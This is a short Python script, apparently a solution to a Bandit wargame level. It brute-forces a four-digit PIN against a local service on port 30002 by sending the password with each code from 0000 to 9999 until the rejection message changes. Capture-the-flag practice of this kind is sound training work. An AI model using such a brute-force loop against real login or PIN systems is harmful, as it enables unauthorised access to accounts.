import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 30002))

password = input("Enter the Bandit password: ")

for pin in range(10000):
    message = f"{password} {pin:04d}".encode()
    sock.send(message)

    response = sock.recv(1024).decode()

    if "Wrong! Please enter the correct current password and pincode. Try again." in response:
        pass
    else:
        print(response)
        break
